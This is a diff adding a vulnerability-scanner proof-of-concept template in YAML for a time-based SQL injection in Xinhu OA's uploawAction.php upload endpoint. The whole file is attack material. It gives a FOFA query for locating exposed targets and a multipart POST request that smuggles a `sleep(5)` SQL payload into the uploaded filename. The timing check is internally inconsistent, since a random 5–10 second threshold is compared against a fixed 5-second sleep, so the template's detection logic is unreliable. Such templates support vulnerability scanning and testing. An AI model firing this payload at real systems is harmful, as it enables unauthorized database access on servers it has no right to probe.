@@ -1,0 +1,28 @@
+id: poc-yaml-rockoa-uploawaction-php-sqli
+info:
+  name: 信呼OA uploawAction.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: xinhu
+  fofa: app="信呼-OA系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /index.php?a=upfile&m=uploaw|api&d=task
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitXo7nCpRwksqD9i
+  data: '------WebKitFormBoundaryitXo7nCpRwksqD9i
+
+    Content-Disposition: form-data; name="file"; filename="a'',web=(select if(123=123,sleep(5),0))--
+    .png"
+
+
+    123
+
+    ------WebKitFormBoundaryitXo7nCpRwksqD9i--'
+  expression: status_code == 200 && contains(body,"\"filepath\"") && contains(body,"\"filename\"")
+    && contains(body,"\"ip\"") && duration > t1 && duration < t2
+transport: http
